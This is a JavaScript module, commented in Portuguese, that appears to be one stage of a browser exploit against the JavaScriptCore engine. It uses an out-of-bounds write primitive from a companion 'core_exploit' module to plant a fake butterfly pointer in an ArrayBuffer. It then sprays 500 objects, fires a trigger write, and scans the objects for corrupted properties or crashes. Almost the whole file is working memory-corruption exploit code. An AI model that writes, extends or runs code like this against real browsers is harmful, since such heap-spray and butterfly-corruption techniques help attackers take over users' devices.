// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object, stringToAdvancedInt64Array } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

const FNAME_BUTTERFLY_CORRUPTION = "butterflyCorruptionAttempt_v21a";

const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offset no oob_buffer onde esperamos que o objeto JS vítima seja "espelhado"
const FOCUSED_VICTIM_JSOBJECT_START_OFFSET_IN_OOB = 0x50; 

const NUM_SPRAY_OBJECTS = 500;
const FAKE_PROP_NAME_STR = "fake_prop"; // Não usado para escrever o nome, mas para acessar
const FAKE_PROP_VALUE = 0x12345678;

// Offset dentro do oob_array_buffer_real onde nosso butterfly falso residirá.
// Deve ser > que a área de metadados do objeto JS falso.
const FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA = 0x100;
// O valor que plantaremos para o campo butterfly* será este offset (assumindo que o dataPointer do oob_buffer é a base)
const PLANTED_BUTTERFLY_POINTER_AS_OFFSET = new AdvancedInt64(FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA, 0);


let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_BUTTERFLY_CORRUPTION}: Tentativa de Corrupção de Butterfly ---`, "test", FNAME_BUTTERFLY_CORRUPTION);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_BUTTERFLY_CORRUPTION);

        // FASE 1: Preparar o Butterfly Falso dentro do oob_array_buffer_real
        // Um butterfly simples pode ter pares (PropertyOffset, JSValue).
        // Para simplificar, vamos apenas plantar um valor onde esperamos que a primeira propriedade esteja.
        // Se o butterfly aponta para FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA,
        // obj.fake_prop poderia ler de FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA + algum_offset_interno_do_butterfly.
        // Vamos plantar FAKE_PROP_VALUE diretamente no FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA.
        logS3(`Plantando valor ${toHex(FAKE_PROP_VALUE)} em oob_buffer[${toHex(FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA)}] (nosso 'fake butterfly content')`, "info", FNAME_BUTTERFLY_CORRUPTION);
        oob_write_absolute(FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA, FAKE_PROP_VALUE, 4); // Plantar como DWORD

        // FASE 2: Plantar o ponteiro para o butterfly falso no oob_array_buffer_real
        // Este é o valor que esperamos que sobrescreva o butterfly* de um objeto JS pulverizado.
        const targetButterflyPtrFieldOffset = FOCUSED_VICTIM_JSOBJECT_START_OFFSET_IN_OOB + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
        logS3(`Plantando ponteiro de butterfly falso (${PLANTED_BUTTERFLY_POINTER_AS_OFFSET.toString(true)}) em oob_buffer[${toHex(targetButterflyPtrFieldOffset)}]`, "info", FNAME_BUTTERFLY_CORRUPTION);
        oob_write_absolute(targetButterflyPtrFieldOffset, PLANTED_BUTTERFLY_POINTER_AS_OFFSET, 8);
        
        const chk_bfly_ptr = oob_read_absolute(targetButterflyPtrFieldOffset, 8);
        logS3(`  Verificação Pós-Plantio: butterfly_ptr_plantado=${chk_bfly_ptr.toString(true)}`, "info", FNAME_BUTTERFLY_CORRUPTION);


        // FASE 3: Spray de Objetos
        logS3(`FASE 3: Pulverizando ${NUM_SPRAY_OBJECTS} objetos simples {prop1: i, prop_to_check: 0xBADF00D}...`, "info", FNAME_BUTTERFLY_CORRUPTION);
        sprayedVictimObjects = [];
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            let obj = {};
            obj.prop1 = i;
            obj.prop_to_check = 0xBADF00D + i; // Propriedade normal
            // A propriedade "fake_prop" não existe inicialmente.
            sprayedVictimObjects.push(obj);
        }
        logS3("Pulverização concluída.", "good", FNAME_BUTTERFLY_CORRUPTION);
        await PAUSE_S3(100);


        // FASE 4: Trigger
        logS3(`FASE 4: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_BUTTERFLY_CORRUPTION);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_BUTTERFLY_CORRUPTION);
        await PAUSE_S3(250);

        // FASE 5: Verificar Objetos Pulverizados
        logS3(`FASE 5: Verificando ${sprayedVictimObjects.length} objetos pulverizados por corrupção de butterfly...`, "info", FNAME_BUTTERFLY_CORRUPTION);
        let corruptedObjectsFound = 0;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            const currentObject = sprayedVictimObjects[i];
            if (!currentObject) continue;

            try {
                // Tentar ler a propriedade que deveria estar no butterfly falso
                // Se o butterfly do currentObject foi corrompido para PLANTED_BUTTERFLY_POINTER_AS_OFFSET,
                // e se a engine tentar resolver "fake_prop" através desse butterfly,
                // e se a estrutura do butterfly falso for tal que "fake_prop" mapeia para FAKE_BUTTERFLY_OFFSET_IN_OOB_DATA,
                // então deveríamos ler FAKE_PROP_VALUE.
                // Para este teste simples, vamos verificar se podemos ler currentObject.fake_prop sem erro
                // e se o valor é o que plantamos no início do "fake butterfly".
                
                // O nome "fake_prop" não está no butterfly falso. O que está lá é FAKE_PROP_VALUE.
                // A leitura de uma propriedade por nome é complexa.
                // Se o butterfly aponta para o nosso buffer, e tentamos ler uma propriedade que NÃO existia,
                // e o butterfly corrompido é interpretado como tendo essa propriedade,
                // ou se o acesso a qualquer propriedade agora lê do nosso buffer.

                // Teste mais simples: verificar se uma propriedade existente mudou ou se podemos ler algo inesperado.
                // Este teste é mais para ver se o objeto crasha ao ser acessado, ou se alguma de suas props mudou.
                
                let prop_val_after = currentObject.prop_to_check; // Acessar uma propriedade existente
                let fake_prop_val = undefined;
                let potential_leak = false;

                // Tentar acessar a propriedade que NÃO existia.
                // Se o butterfly foi corrompido, isso pode ter efeitos estranhos.
                if ("fake_prop" in currentObject) { // Checar se a propriedade "apareceu"
                    fake_prop_val = currentObject.fake_prop;
                    if (fake_prop_val === FAKE_PROP_VALUE) {
                        logS3(`    !!!! OBJETO [${i}] CORROMPIDO COM SUCESSO !!!!leu '${FAKE_PROP_NAME_STR}' como ${toHex(fake_prop_val)}`, "vuln", FNAME_BUTTERFLY_CORRUPTION);
                        corruptedObjectsFound++;
                        document.title = `BUTTERFLY CORRUPT (${corruptedObjectsFound})!`;
                        potential_leak = true;
                    } else {
                        logS3(`    Objeto [${i}]: '${FAKE_PROP_NAME_STR}' apareceu, mas valor é ${toHex(fake_prop_val)} (esperado ${toHex(FAKE_PROP_VALUE)})`, "warn", FNAME_BUTTERFLY_CORRUPTION);
                        potential_leak = true; // Ainda interessante
                    }
                }
                
                // Checar se propriedades originais ainda estão lá ou mudaram
                if (currentObject.prop1 !== i) {
                     logS3(`    Objeto [${i}]: prop1 mudou de ${i} para ${currentObject.prop1}`, "warn", FNAME_BUTTERFLY_CORRUPTION);
                     potential_leak = true;
                }
                if (prop_val_after !== (0xBADF00D + i) && !potential_leak) { // Evitar log duplo se fake_prop já foi um sucesso
                    logS3(`    Objeto [${i}]: prop_to_check mudou de ${toHex(0xBADF00D + i)} para ${toHex(prop_val_after)}`, "warn", FNAME_BUTTERFLY_CORRUPTION);
                    potential_leak = true;
                }
                if (potential_leak && corruptedObjectsFound === 0) { // Se não foi o caso ideal de fake_prop
                     corruptedObjectsFound++; // Contar qualquer anomalia
                     document.title = `BUTTERFLY ANOMALY (${corruptedObjectsFound})!`;
                }


            } catch (e) {
                logS3(`    ERRO ao acessar objeto pulverizado [${i}]: ${e.message}. Possível corrupção!`, "vuln", FNAME_BUTTERFLY_CORRUPTION);
                corruptedObjectsFound++;
                document.title = `BUTTERFLY CRASH (${corruptedObjectsFound})!`;
            }
        }

        if (corruptedObjectsFound > 0) {
            logS3(`  Total de ${corruptedObjectsFound} objetos pulverizados encontrados com potencial corrupção de butterfly.`, "good", FNAME_BUTTERFLY_CORRUPTION);
        } else {
            logS3("  Nenhuma corrupção de butterfly detectada nos objetos pulverizados.", "warn", FNAME_BUTTERFLY_CORRUPTION);
            document.title = "Nenhuma Corrupção Butterfly";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_BUTTERFLY_CORRUPTION}: ${e.message}`, "critical", FNAME_BUTTERFLY_CORRUPTION);
        document.title = `${FNAME_BUTTERFLY_CORRUPTION} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_BUTTERFLY_CORRUPTION} Concluído ---`, "test", FNAME_BUTTERFLY_CORRUPTION);
    }
}
